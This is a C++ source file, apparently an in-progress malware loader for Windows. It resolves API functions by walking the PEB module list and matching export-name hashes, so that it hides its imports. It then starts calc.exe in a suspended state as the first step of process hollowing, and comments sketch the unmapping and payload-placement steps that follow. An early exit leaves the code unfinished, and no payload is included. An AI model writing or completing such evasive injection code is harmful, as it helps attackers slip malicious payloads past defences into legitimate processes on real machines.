#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <intrin.h>
#include "ModuleIterator.hpp" // Iterator class used to iterate over the module list
#include "CheckSumGen.hpp"    // Header file with the functions I used to generate the checksum
#include "IAT.hpp"			  // IAT simulator

// Comment this line below to enable debug messages, and vice-versa
//#define TRACE
#define TRACE_PEB

template <typename T>
T retrieve_function_by_hash(unsigned long funcHash, const char* base, const wchar_t* modName) {
	// Retrieve ntHeader
	const WinDecls::IMAGE_NT_HEADERS* ntHeaders = (const WinDecls::IMAGE_NT_HEADERS*)(base + ((WinDecls::IMAGE_DOS_HEADER*)base)->e_lfanew);
	// Retrieve first entry on DATA_DIRECTORY list
	const WinDecls::IMAGE_DATA_DIRECTORY dataDir = (const WinDecls::IMAGE_DATA_DIRECTORY)(ntHeaders->OptionalHeader.DataDirectory[0]);
	// Retrieve the RVA from this entry (the first entry on DataDirectory is the EXPORT_DIRECTORY)
	const unsigned long exportDirRVA = dataDir.VirtualAddress;

	// If exportDirRVA is NULL, it means the file doesn't have an export table, that means it's probably the current module
	if (exportDirRVA == NULL) {
#if defined(TRACE)
		wprintf(L"[-] Couldn't find export directory on module \"%s\", skipping...\n", modName);
#endif
		return NULL;
	}

	// Retrieve export directory
	const WinDecls::IMAGE_EXPORT_DIRECTORY* exportDir = (const WinDecls::IMAGE_EXPORT_DIRECTORY*)(base + exportDirRVA);
	// Retrieve NumberOfNames
	unsigned long NumberOfNames = exportDir->NumberOfNames;
	// Retrieve RVA to string table
	const unsigned long RVAOfNames = exportDir->AddressOfNames;

#if defined(TRACE)
	wprintf(L"NumberOfNames in \"%s\" = %d\n", modName, NumberOfNames);
#endif
	// Iterate over the string table, comparing the strings with the one we want to find
	for (int index = NumberOfNames - 1; index >= 0; index--) {
		// Had to use reinterpret_cast here, otherwise VS wouldn't compile
		// Retrieve symbol name @ index on string table
		const char* namePtr = (const char*)(base + reinterpret_cast<const unsigned long*>(base + RVAOfNames)[index]);
		unsigned long checkSum = check_sum_gen(namePtr);

#if defined(TRACE)
		printf("[%d] = \"%s\"\n", index, namePtr);
#endif

		//Compares with our intended function
		if ( check_sum_is_eq(checkSum, funcHash) ) {
			// Retrieve pointer to ordinal Table
			const unsigned short* ordTable = (const unsigned short*)(base + exportDir->AddressOfNameOrdinals);
			// Retrieve pointer to RVA table
			const unsigned long* funcPtrTable = (const unsigned long*)(base + exportDir->AddressOfFunctions);

			// Retrieve and return function pointer
			return (T)(base + funcPtrTable[ordTable[index]]);
		}
	}
	// If no function was found, return NULL
	return NULL;
}

template <typename T>
T iterate_modules(unsigned long funcHash, ModuleIterator& iter) {
	do {
		// Retrieve module base addr
		const char* base = iter.get_base();
		// Retrieve module name
		const wchar_t* modName = iter.get_modName();

		// Looks for function inside module, and if found, return and reset iterator to base module
		// If you are patient enough you could elaborate a correct order of import so you wouldn't need to reset the iterator after every function found
		// It would drastically improve performance
		T funcPtr = retrieve_function_by_hash<T>(funcHash, base, modName);
		if (funcPtr != NULL) {
			iter.reset();
			return funcPtr;
		}

		iter.next();
	} while (iter.get_base() != NULL);

	return NULL;
}

#define FIELD_OFFSET(t,f)       ((long)(unsigned long *)&(((t*) 0)->f))
#define IMAGE_FIRST_SECTION( ntheader ) ((WinDecls::IMAGE_SECTION_HEADER*)        \
    ((unsigned long *)(ntheader) +                                            \
     FIELD_OFFSET( WinDecls::IMAGE_NT_HEADERS, OptionalHeader ) +                 \
     ((ntheader))->FileHeader.SizeOfOptionalHeader   \
    ))

char *GetPayload(char *lpModuleBase) {
	const WinDecls::IMAGE_NT_HEADERS* ntHeaders = (const WinDecls::IMAGE_NT_HEADERS*)(lpModuleBase + ((WinDecls::IMAGE_DOS_HEADER*)lpModuleBase)->e_lfanew);

	// find .text section

	WinDecls::IMAGE_SECTION_HEADER *pishText = IMAGE_FIRST_SECTION(ntHeaders);
	// get last IMAGE_SECTION_HEADER
	WinDecls::IMAGE_SECTION_HEADER* pishLast = (WinDecls:: IMAGE_SECTION_HEADER*)(pishText + (ntHeaders->FileHeader.NumberOfSections - 1));

	return (char *)(ntHeaders->OptionalHeader.ImageBase + pishLast->VirtualAddress);
}

IAT_t iat;

int main(int argc, char **argv) {
	// Checksum of the functions we want to retrieve
	// check_sum_gen("LoadLibraryA") = 0x8dbeba00 and so on and so forth
	const unsigned long hLoadLibraryA		  = 0x8dbeba00;
	const unsigned long hMessageBoxA		  = 0xf6c562e0;
	const unsigned long hVirtualAlloc		  = 0x10f64400;
	const unsigned long hVirtualprotect		  = 0x59664000;
	const unsigned long hCreateProcessA		  = 0xf22c4080;
	const unsigned long hGetProcAddress		  = 0x68b4800;
	const unsigned long hGetModuleHandleA	  = 0xdffe0000;
	const unsigned long hZwUnmapViewOfSection = 0xc9f17c00;

	/*unsigned long hZwUnmapViewOfSection = check_sum_gen("ZwUnmapViewOfSection");
	printf("ZwUnmapViewOfSection = %x\n", hZwUnmapViewOfSection);

	exit(1);*/

	iat.pLoadLibrary = NULL;
	iat.pMessageBox =  NULL;
	// Read PEB at fs:[0x30]
	const WinDecls::PEB_T* pebPtr = (WinDecls::PEB_T*)__readfsdword(0x30);
	const unsigned long baseAddr = pebPtr->ImageBaseAddress;

#if defined(TRACE_PEB)
	printf("[+] PEB @: %x\n", pebPtr);
	printf("[+] ImageBaseAddres @: %x\n", baseAddr);
#endif

	// Retrieve LDR_DATA structure
	const WinDecls::PEB_LDR_DATA_T* Ldr = pebPtr->Ldr;
	// Retrieve the first link and typecast to an entry type
	const WinDecls::LDR_DATA_TABLE_ENTRY_T* modPtr = (const WinDecls::LDR_DATA_TABLE_ENTRY_T*)(Ldr->InLoadOrderModuleList.Flink);
	
	// Instantiate the iterator class
	ModuleIterator iter(modPtr, Ldr);

	iat.pLoadLibrary = iterate_modules<LoadLibrary_t>(hLoadLibraryA, iter);
	//iat.pVirtualAlloc = iterate_modules<VirtualAlloc_t>(hVirtualAlloc, iter);
	//iat.pVirtualProtect = iterate_modules<VirtualProtect_t>(hVirtualprotect, iter);
	iat.pCreateProcessA = iterate_modules<CreateProcessA_t>(hCreateProcessA, iter);
	iat.pGetProcAddress = iterate_modules<GetProcAddress_t>(hGetProcAddress, iter);
	iat.pGetModuleHandle = iterate_modules<GetModuleHandleA_t>(hGetModuleHandleA, iter);
	iat.pZwUnmapViewOfSection = iterate_modules<ZwUnmapViewOfSection_t>(hZwUnmapViewOfSection, iter);

	exit(1);

	// Calls intended function
	// The code below needs trimming, but it is still new and I was checking if it worked, and it did! :D
	//if (iat.pLoadLibrary != NULL) {
	//	printf("[!] LOADING USER32.DLL...\n");
	//	const char *pHandle = (const char *)iat.pLoadLibrary("user32.dll");
	//	if (pHandle != NULL) {
	//		printf("  [!] MODULE LOADED @ %p\n", pHandle);
	//		iat.pMessageBox = retrieve_function_by_hash<MessageBox_t>(0xf6c562e0, pHandle, L"user32.dll");
	//		if (iat.pMessageBox != NULL)
	//			iat.pMessageBox(NULL, "Hello", "From the other side", 0x00000000L);
	//	}
	//}

	// process info
	WinDecls::STARTUPINFOA si;
	WinDecls::PROCESS_INFORMATION pi;
	memset(&pi, 0, sizeof(pi));
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = 0x00000001;  //STARTF_USESHOWWINDOW;
	si.wShowWindow = 5;		  //SW_SHOW;

	unsigned long CREATE_SUSPENDED = 0x00000004;
	unsigned long DETACHED_PROCESS = 0x00000008;
	// first create process as suspended
	bool createResult = iat.pCreateProcessA("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, false, CREATE_SUSPENDED | DETACHED_PROCESS, NULL, NULL, &si, &pi);
	if (createResult == 0) {
		printf("Failed to create process\n");
		exit(1);
	}


	//iat.pZwUnmapViewOfSection(pi.hProcess, (LPVOID)pinh->OptionalHeader.ImageBase);
	// unmap memory space for our process
	//pfnGetProcAddress fnGetProcAddress = (pfnGetProcAddress)GetKernel32Function(0xC97C1FFF);
	//pfnGetModuleHandleA fnGetModuleHandleA = (pfnGetModuleHandleA)GetKernel32Function(0xB1866570);
	//pfnZwUnmapViewOfSection fnZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)fnGetProcAddress(fnGetModuleHandleA(get_ntdll_string()), get_zwunmapviewofsection_string());

	//char* textSection = GetPayload((char *)iat.pMessageBox);
	//printf("You can place the payload at: %x\n", (unsigned long)textSection);

    return 0;
}
